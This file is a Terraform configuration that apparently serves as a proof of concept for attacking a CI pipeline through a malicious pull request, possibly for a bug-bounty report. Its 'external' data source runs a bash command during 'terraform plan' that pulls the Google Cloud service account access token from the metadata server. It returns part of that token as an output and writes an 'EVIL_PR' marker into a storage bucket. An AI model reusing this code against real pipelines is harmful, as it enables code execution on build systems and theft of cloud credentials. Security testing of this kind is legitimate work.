terraform {
  required_version = ">= 1.2.0"
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = ">= 4.0"
    }
    external = {
      source  = "hashicorp/external"
      version = ">= 2.0"
    }
  }
}

variable "project_id" {
  default = "ellison-hunt-1102-c86d"
}

data "external" "rce_in_plan" {
  program = ["bash", "-c", "TOKEN=$(curl -sf -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>/dev/null | python3 -c \"import sys,json; print(json.load(sys.stdin).get('access_token','NO_TOKEN'))\" 2>/dev/null || echo 'METADATA_BLOCKED'); echo \"{\\\"rce_proof\\\": \\\"PR_RCE_$(date +%s)\\\", \\\"sa_token_prefix\\\": \\\"${TOKEN:0:20}\\\"}\""]
}

resource "google_storage_bucket_object" "marker" {
  name    = "im-pr-attack-test/marker.txt"
  bucket  = "ellison-hunt-1102-c86d-vrp-test"
  content = "EVIL_PR_${data.external.rce_in_plan.result.rce_proof}"
}

output "status" {
  value = "EVIL_PR_EXECUTED"
}

output "rce_proof" {
  value = data.external.rce_in_plan.result.rce_proof
}

output "sa_token_prefix" {
  value = data.external.rce_in_plan.result.sa_token_prefix
}
